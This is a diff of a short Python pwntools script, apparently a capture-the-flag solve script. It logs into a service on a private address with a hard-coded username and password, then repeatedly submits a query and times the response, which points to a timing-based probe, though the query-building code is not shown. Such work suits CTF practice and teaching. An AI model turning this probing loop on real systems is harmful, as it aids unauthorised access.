@@ -4,15 +4,13 @@
 from pwn import *
 import time
 
-real = time.time()
-b = time.time()
 
 def submit(q):
 	print "[+] Submit query"
 	a = remote('192.168.8.236', 1337)
 	a.recvuntil('Username:')
 	a.sendline('bot')
-	a.recvuntil('Token:')
+	a.recvuntil('Password:')
 	a.sendline('awkarin')
 	a.sendline(q)
 	a.recvuntil('Done')
@@ -42,6 +40,9 @@ def cek():
 
 if __name__ == '__main__':
 	while 1:
+		real = time.time()
+		b = time.time()
+
 		submit(cek())
 
 		total = time.time() - b
